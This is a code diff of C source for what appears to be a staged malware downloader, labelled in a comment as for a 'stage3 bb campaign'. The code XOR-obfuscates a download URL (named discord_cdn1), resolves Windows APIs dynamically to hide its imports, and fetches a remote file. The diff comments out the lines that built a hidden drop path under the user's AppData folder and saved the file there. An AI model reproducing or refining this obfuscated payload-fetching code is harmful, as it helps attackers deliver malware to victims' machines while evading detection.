@@ -118,41 +118,41 @@ int main(void){
 	//for the stage3 bb campaign
 	char encrypted[] = { 0x3c,0x1c,0x1d,0x03,0x53,0x73,0x5c,0x0f,0x17,0x0c,0x0b,0x0e,0x37,0x0c,0x10,0x11,0x0a,0x06,0x44,0x2a,0x15,0x09,0x7a,0x0b,0x06,0x1e,0x0f,0x28,0x07,0x54,0x15,0x0b,0x0d,0x4d,0x36,0x0b,0x17,0x01,0x4a,0x4d,0x13,0x7f,0x54,0x41,0x65,0x5b,0x5f,0x43,0x17,0x71,0x41,0x19,0x41,0x5c,0x51,0x19,0x6a,0x4a,0x5a,0x41,0x52,0x4d,0x16,0x7f,0x56,0x41,0x61,0x51,0x58,0x45,0x12,0x71,0x4a,0x11,0x44,0x5c,0x4a,0x53,0x27,0x04,0x04,0x17,0x56,0x2b,0x42,0x29,0x3a,0x1b,0x62,0x5c,0x47,0x07,0x58,0x3d };
 	//xor encrypted strings of the target file path we're going to download to.
-	char encryptedFilePathPart1[] = { 0x17,0x52,0x35,0x26,0x53,0x2c,0x01,0x53,0x28 };
-	char encryptedFilePathPart2[] = { 0x08,0x29,0x19,0x03,0x64,0x28,0x07,0x41,0x28,0x24,0x0a,0x43,0x32,0x09,0x3f,0x26,0x00,0x19,0x50,0x17 };
+	//char encryptedFilePathPart1[] = { 0x17,0x52,0x35,0x26,0x53,0x2c,0x01,0x53,0x28 };
+	//char encryptedFilePathPart2[] = { 0x08,0x29,0x19,0x03,0x64,0x28,0x07,0x41,0x28,0x24,0x0a,0x43,0x32,0x09,0x3f,0x26,0x00,0x19,0x50,0x17 };
 
 	// xor decrypted versions of the strings above.
 	char* discord_cdn1 = stringDeobfuscator(encrypted, sizeof(encrypted));
 
-	//create places to hold the urls.
+	//create places to hold the url strings
 	LPVOID hostName = (char*)malloc(50);
 	LPVOID resourcePath = (char*)malloc(150);
 
 	char userName[50];
 	DWORD outSize;
 
-	t_GetUserNameA pGetUserNameA = NULL;
-	WCHAR strAdvapi32dll[] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0x0 };
-	char strGetUserNameA[] = { 'G','e','t','U','s','e','r','N','a','m','e','A',0x0 };
-	pGetUserNameA = (t_GetUserNameA)hlpGetProcAddress(hlpGetModuleHandle(strAdvapi32dll), strGetUserNameA);
-	pGetUserNameA(userName, &outSize);
+	//t_GetUserNameA pGetUserNameA = NULL;
+//	WCHAR strAdvapi32dll[] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0x0 };
+	//char strGetUserNameA[] = { 'G','e','t','U','s','e','r','N','a','m','e','A',0x0 };
+	//pGetUserNameA = (t_GetUserNameA)hlpGetProcAddress(hlpGetModuleHandle(strAdvapi32dll), strGetUserNameA);
+	//pGetUserNameA(userName, &outSize);
 
 	//initialize room for entire file path -minus the file name.
-	char filePath[260] = { 0 };
+	//char filePath[260] = { 0 };
 	//LPVOID filePath = (char*)malloc(260); // 260 b/c max file path length in windows.
 
-	char* filePathPart1 = stringDeobfuscator(encryptedFilePathPart1, sizeof(encryptedFilePathPart1));
-	char* filePathPart2 = stringDeobfuscator(encryptedFilePathPart2, sizeof(encryptedFilePathPart2));
+	//char* filePathPart1 = stringDeobfuscator(encryptedFilePathPart1, sizeof(encryptedFilePathPart1));
+	//char* filePathPart2 = stringDeobfuscator(encryptedFilePathPart2, sizeof(encryptedFilePathPart2));
 	
 	//Create File Path using C:\Users\ as part 1 + UserName + \ AppData Microsoft folder.
-	 lstrcatA(filePath, filePathPart1);
-	 lstrcatA(filePath, userName);
-	 lstrcatA(filePath, filePathPart2);
+	// lstrcatA(filePath, filePathPart1);
+	 //lstrcatA(filePath, userName);
+	 //lstrcatA(filePath, filePathPart2);
 
 	//parse URL to perform download properly.
 	parseUrl(discord_cdn1, (char*)hostName, (char*)resourcePath);
 	//download file and save it to disk.
-	do_request((const char*)hostName, (const char*)resourcePath, "x-goog-stored-content-length", filePath);
+	do_request((const char*)hostName, (const char*)resourcePath, "x-goog-stored-content-length");// , filePath);
 	
 	return 0;
 }
